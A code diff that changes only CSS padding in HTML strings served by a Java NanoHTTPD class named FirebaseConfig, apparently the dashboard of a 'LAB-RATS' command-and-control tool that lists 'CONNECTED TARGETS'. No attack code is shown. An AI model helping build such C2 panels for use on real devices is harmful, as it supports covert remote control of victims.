@@ -228,7 +228,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.trim().isEmpty()) c2Url = "/c2-dashboard";
         String renderBackBar = isRenderWebhook() ? 
-            "<div class=\"c2-top-bar\" style=\"display: flex; justify-content: flex-start; align-items: center; width: 100%; padding: 5px 0 10px 0;\"><a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; CONNECTED TARGETS</a></div>" : "";
+            "<div class=\"c2-top-bar\" style=\"display: flex; justify-content: flex-start; align-items: center; width: 100%; padding: 12px 0 6px 0;\"><a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; CONNECTED TARGETS</a></div>" : "";
 
         return "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
@@ -242,7 +242,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "</head>" +
             "<body>" +
             "<div class=\"container\">" + renderBackBar +
-            "  <div class=\"header\" style=\"padding: 45px 0 10px 0 !important; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
+            "  <div class=\"header\" style=\"padding: 5px 0 0 0 !important; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
             "    <img src=\"/c2/header_dashboard.png?v=" + System.currentTimeMillis() + "\" style=\"width: 65%; max-width: 798px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: none !important; object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
             "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
             "  </div>" + navHtml;
